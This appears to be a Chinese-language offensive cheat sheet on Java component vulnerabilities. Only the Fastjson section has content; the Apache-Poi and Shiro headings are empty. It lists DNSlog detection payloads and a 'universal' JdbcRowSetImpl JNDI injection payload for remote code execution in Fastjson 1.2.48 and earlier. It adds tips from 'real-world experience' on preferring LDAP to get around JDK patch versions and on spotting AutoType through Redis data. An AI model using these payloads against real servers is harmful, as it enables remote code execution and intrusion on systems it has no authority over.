

# JAVA组件漏洞

[TOC]

- [Fastjson](#1. Fastjson)

- [Apache-Poi](#Apache-poi)

- [Shiro](#Shiro)

  

## 1. Fastjson

### 	1.1 版本 <= 1.2.48

### 		1.1.1 回显

```
======= 回显 =======
{"@type":"java.net.Inet4Address", "val":"dnslog"}
{"@type":"java.net.Inet6Address", "val":"dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":, "val":"dnslog"}}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}
{{"@type":"java.net.URL", "val":"dnslog"}:"aaa"}
Set[{"@type":"java.net.URL", "val":"dnslog"}]
Set[{"@type":"java.net.URL", "val":"dnslog"}
{{"@type":"java.net.URL", "val":"dnslog"}:0
```

### 		1.1.2  RCE

```
======= 通杀payload =======
{
    "rand1": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "rand2": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "rmi://127.0.0.1:1099/aaa",
      "autoCommit": true
    }
}
```

### 		1.1.3 利用要点

(备注：根据实战中经验，更推荐使用Ldap协议进行漏洞利用）

RMI协议的利用方式 在JDK 6u132/7u122/8u113 及以上版本中修复了

LDAP协议的利用方式 在JDK 6u211/7u201/8u191 及以上版本中修复了

LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制

当发现一台Redis的数据中含有@type的字样时，意味着AutoType多半是开的



## 2. Apache-poi

## 3. Shiro
